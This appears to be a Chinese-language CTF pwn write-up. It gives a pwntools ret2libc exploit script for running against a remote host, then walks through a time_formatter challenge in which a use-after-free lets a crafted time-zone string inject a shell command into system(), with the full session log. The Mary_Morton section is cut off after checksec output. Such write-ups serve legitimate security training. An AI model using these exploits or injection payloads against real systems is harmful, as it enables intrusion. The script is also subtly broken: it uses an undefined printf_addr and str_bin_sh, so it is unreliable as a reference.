
```python
import sys
from pwn import *
from LibcSearcher import LibcSearcher
rv = lambda : io.recv()
rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
se = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
sconnect = lambda : io.interactive()
context.log_level = "DEBUG"
pwn_file = './pwn7'
elf = ELF(pwn_file)
if len(sys.argv) < 2:
    IS_LOCAL = 1
    io = process(pwn_file)
else:
    IS_LOCAL = 0
    sys_argv = sys.argv[1].split(':')
    io = remote(sys_argv[0], int(sys_argv[1]))
#---------------------------------------------------------
payload = '1'+'\x00'*6+'\xFF\x00'
'''
if IS_LOCAL:
    gdb.attach(io,"break *0x8048824\nc")
    pause()
'''
se(payload)
puts_addr = u32(io.recv()[:4])
if IS_LOCAL:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    libc_base = printf_addr - libc.sym['printf']
    system_addr = libc_base + libc.sym['system']
else:
    libc = ELF('libc6-i386_2.23-0ubuntu11.2_amd64.so')
    libc_base = printf_addr - libc.sym['printf']
    system_addr = libc_base + libc.sym['system']
#or choose to use LibcSearcher
'''
libc=LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')
'''
log.info('puts_addr: 0x%x'%puts_addr)
log.info('system_addr: 0x%x'%system_addr)
log.info('str_bin_sh: 0x%x'%str_bin_sh)
payload = 'A'*235+p32(system_addr)+p32(0xdeadbeef)+p32(str_bin_sh)
se(payload)
sconnect()
```

需要打服务器的时候直接加个参数就可以：

`python exp.py 111.200.241.244:56070`

## TASKS

### pwn-200

《CTF竞赛指南》上有详解。

### pwn-100

《CTF竞赛指南》上有详解。

### time_formatter

这个题目涉及的漏洞是悬空指针（dangling pointer）和UAF：

```c
__int64 sub_400F8F()
{
    __int64 result;
    // rax
    char s[16]; // [rsp+8h] [rbp-20h] BYREF
    unsigned __int64 v2; // [rsp+18h] [rbp-10h]

    v2 = __readfsqword(0x28u);
    free_400C7E(FORMAT_BUF_HEAP); // double free
    free_400C7E(time_zone_heap);
    __printf_chk(1LL,"Are you sure you want to exit (y/N)? ");
    fflush(stdout);
    fgets(s,16,stdin);
    result = 0LL;
    if ( (s[0] & 0xDF) == 'Y' )
    {
        puts("OK, exiting.");
        result = 1LL;
    }
    return result;
}
```

可以看到，指针在用户确定退出之前就已经 `free` 了，`free` 之后也没有及时指向 `NULL`。这导致我们可以重新申请 `format_buf` 指向的堆内存，然后给予其新的值。再来看看 `show` 部分的代码：

```c
__int64 sub_400EA3()
{
    char command[2048]; // [rsp+8h] [rbp-810h] BYREF
    unsigned __int64 v2; // [rsp+808h] [rbp-10h]

    v2 = __readfsqword(0x28u);
    if ( FORMAT_BUF_HEAP )
    {
        __snprintf_chk(command,2048LL,1LL,2048LL,"/bin/date -d @%d +'%s'",TIME,FORMAT_BUF_HEAP);
        __printf_chk(1LL,"Your formatted time is: ");
        fflush(stdout);
        if ( getenv("DEBUG") )
            __fprintf_chk(stderr,1LL,"Running command: %s\n",command);
        setenv("TZ",time_zone_heap,1);
        system(command);
    }
    else
    {
        puts("You haven't specified a format!");
    }
    return 0LL;
}
```

可以看到如果设置了环境变量会有不少提示信息，我们这里设置一个临时变量：

```
export DEBUG=1
```

然后看到程序中有 `system` 函数，而且部分参数是我们提供的输入；我们应该想到这里可以用 `'` 闭合命令，然后用管道执行一个新的命令。程序的本意是想执行这样的一条命令：

```
date -d @1568880277 +"%Y-%m-%d %H:%M:%S"
2019-09-19 16:04:37
```

我们想要执行这样一个命令：

```
/bin/date -d @0 +'%y' | cat 'flag'
```

根据以上思路，利用悬空指针漏洞绕过检查找出 `flag` 的值：

```
dc@ubuntu:~/playground$ ./time_formatter
Welcome to Mary's Unix Time Formatter!
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 1
Format: b
strdup(0x7fffffffd948) = 0x603420
Format set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 5
free(0x603420)
free((nil))
Are you sure you want to exit (y/N)? n
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: %y' | cat 'flag
strdup(0x7fffffffd948) = 0x603420
# assert timeformat_buf == timezone
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 4
Your formatted time is: Running command: /bin/date -d @0 +'%y' | cat 'flag'
flag{ABCD}
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> ^C
```

### Mary_Morton

拿到程序先看下信息：

```
dc@ubuntu:~/playground$ file 22e2d7579d2d4359a5a1735edddef631
22e2d7579d2d4359a5a1735edddef631: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped
dc@ubuntu:~/playground$ pwn checksec 22e2d7579d2d4359a5a1735edddef631
[*] '/home/dc/playground/22e2d7579d2d4359a5a1735edddef631'
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

我们需要绕过金丝雀，再看程序关键流程如下：
